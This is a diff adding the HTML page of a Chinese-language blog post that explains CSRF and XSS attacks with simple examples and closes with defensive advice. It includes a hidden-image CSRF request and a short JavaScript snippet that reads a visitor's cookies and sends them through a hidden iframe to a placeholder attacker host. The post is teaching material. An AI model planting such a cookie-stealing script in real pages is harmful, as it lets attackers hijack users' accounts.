@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>CSRF 和 XSS | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。 说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？ 不过，我还是想做个简短的笔记，来回忆这几天的想法。 什麽是 CSRFC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSRF 和 XSS">
+<meta property="og:url" content="http://yoursite.com/2019/10/27/CSRF-%E5%92%8C-XSS/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。 说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？ 不过，我还是想做个简短的笔记，来回忆这几天的想法。 什麽是 CSRFC">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-10-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-03-07T06:52:12.250Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-CSRF-和-XSS" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/27/CSRF-%E5%92%8C-XSS/" class="article-date">
+  <time datetime="2019-10-26T16:00:00.000Z" itemprop="datePublished">2019-10-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      CSRF 和 XSS
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>最近在做一个网站，因爲涉及到比较重要的账号，我一直战战兢兢，生怕一个不小心就搞出问题了。好在，rails 在安全方面所做的努力比我做的多得多。</p>
+<p>说到网络攻击，最常见到的两个词就是 CSRF 和 XSS。这是比较常见，也比较简单的攻击了。只要网站的设计者缺少这方面的常识，就能轻易攻击。不过现在的网站框架都会加上这方面的防护了吧？</p>
+<p>不过，我还是想做个简短的笔记，来回忆这几天的想法。</p>
+<h2 id="什麽是-CSRF"><a href="#什麽是-CSRF" class="headerlink" title="什麽是 CSRF"></a>什麽是 CSRF</h2><p>Crossing Site Request Forgery，跨站请求僞造。是一种利用 Cookies 进行攻击的方式。</p>
+<p>在解释 CSRF 前，我们先来了解一下 Cookies 和 Sessions。由于 HTTP 的无状态机制，任意两个网页之间都是无关联的。爲了让它们产生关联，诞生了 sessions 和 cookies。当我们打开网站时，都是一个会话(sessions)，浏览器会临时保存这个 sessions，服务器靠着 sessions 来识别衆多用户中谁是谁，正因爲 浏览器 保存着 sessions，服务器才有能力辨识，当前访问的用户是 A 不是 B。浏览器被关闭后，就会消去 sessions。而 cookies 是保存得更久一点的方法，即使浏览器关掉后，也会保留一段时间。</p>
+<p>大坏蛋就利用这两个机制，发起了 CSRF。</p>
+<p>举个简单的例子。小明在 A 网站（<a href="http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了" target="_blank" rel="noopener">http://A.com）登录后，爲了保证访问下一个页面时，服务器知道他是小明，浏览器里保存了</a> Cookies，当访问该网站的下一个页面是，就会连同 Cookies 一同发出。之后小明发表了一篇 id 爲 3 的论文。大坏蛋的 B 网站里，有一张图片是这样的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&#39;https:&#x2F;&#x2F;A&#x2F;delete?id&#x3D;3&#39; width&#x3D;&#39;0&#39; height&#x3D;&#39;0&#39; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码表示，在网页上显示长宽爲 0 的图片。虽然长宽爲 0，小明看不到，但浏览器却能看到，它会尝试访问 A 网站，并执行删除操作，将 id 爲 3 的文章删了。</p>
+<p>如果是其它人的浏览器，访问了也就访问了，他们的浏览器访问 <a href="https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有" target="_blank" rel="noopener">https://A/delete?id=3之后，并没有多大影响，因爲他们的浏览器里没有</a> cookies，没有登录，拒决了访问。</p>
+<p>但对小明而言，这就是大问题了。小明的浏览器会访问 <a href="https://A/delete?id=3，然后将" target="_blank" rel="noopener">https://A/delete?id=3，然后将</a> A 网站的 Cookies 也一併伟过去。这个请求被A 网站的服备器收到，它们验证 Cookies，也没问题，是小明本人发过来的，那就执行删除操作吧。</p>
+<p>于是，小明在不明不白的情况下，将自己发表在 A 网站上的文章删除了。</p>
+<p>CSRF 是利用了用户对浏览器的信任，进行了攻击。XSS 和 CSRF 很像，但利用的是用户的另一个弱点。</p>
+<h2 id="什麽是XSS"><a href="#什麽是XSS" class="headerlink" title="什麽是XSS"></a>什麽是XSS</h2><p>和上面的方法很相似，攻击者在通过代码注入的形式，将攻击代码写入网页。</p>
+<p>但它并非进行 CSRF 攻击，而是通过 JS 代码，获取打开网页的用户 cookies。</p>
+<p>还是个简单的例子。</p>
+<p>小明吸取了教训，在登录其它网站前，会登出 A 网站的用户，只有在访问 A 网站时，才会登录。</p>
+<p>然而攻击者 小坏蛋 在 A 网站发表了一篇文章，然后在文章里注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 用 &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;&lt;&#x2F;script&gt; 包起来放在文章中</span><br><span class="line">(function(window, document) &#123;</span><br><span class="line">    var cookies &#x3D; document.cookie;</span><br><span class="line">    var xssURIBase &#x3D; &quot;http:&#x2F;&#x2F;小坏蛋的IP&#x2F;myxss&#x2F;&quot;;</span><br><span class="line">    var xssURI &#x3D; xssURIBase + window.encodeURI(cookies);</span><br><span class="line">    &#x2F;&#x2F; 建立隐藏 iframe 用于通讯</span><br><span class="line">    var hideFrame &#x3D; document.createElement(&quot;iframe&quot;);</span><br><span class="line">    hideFrame.height &#x3D; 0;</span><br><span class="line">    hideFrame.width &#x3D; 0;</span><br><span class="line">    hideFrame.style.display &#x3D; &quot;none&quot;;</span><br><span class="line">    hideFrame.src &#x3D; xssURI;</span><br><span class="line">    document.body.appendChild(hideFrame);</span><br><span class="line">&#125;)(window, document);</span><br></pre></td></tr></table></figure>
+
+<p>明面上，这篇文章没什麽问题，因爲 iframe 被隐藏了。但只要有人点开，就会触发上面的代码，将 cookies 发送到小坏蛋的网站。小坏蛋就获得了其他人的身份，大摇大摆的删除文章了。</p>
+<p>与 CSRF 不同，这一次，小明并没有上不正规的网站，他浏览的是正规的 A 的网站，却依旧遭到了攻击。这一次，攻击的是 小明 对网站的信任。</p>
+<hr>
+<p>所以，有些时候，我们不能将用户受到网络攻击，归到他们不注重自身安全（虽然很大一部分时间的确是这样的）。用户更多时候，是没有能力保证安全的，即使再注意，不上小网站，也会遭到 XSS 攻击。</p>
+<p>因此在设计一个系统，一个网站时，我们要加强系统本身的抗打击能力。比如对付 CSRF，就验证访问源，使用 JWT 替代 cookies；对付 XSS，用过滤，警惕自己的用户。</p>
+<p>道高一尺，魔高一丈。最近看了关于网络安全方面的文章，觉得自己还有很长的路要走。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/27/CSRF-%E5%92%8C-XSS/" data-id="ck7h91ty30009633xaeok9jaa" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/03/07/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Hello World
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">线程锁（一）</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/03/07/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/27/CSRF-%E5%92%8C-XSS/">CSRF 和 XSS</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/13/%E7%BA%BF%E7%A8%8B%E9%94%81%EF%BC%88%E4%B8%80%EF%BC%89/">线程锁（一）</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/23/%E6%AE%B5%E5%BC%8F%E5%AD%98%E5%82%A8/">段式存储</a>
+          </li>
+        
+          <li>
+            <a href="/2019/09/08/%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95%EF%BC%88%E4%BA%8C%EF%BC%89/">调度算法（二）</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
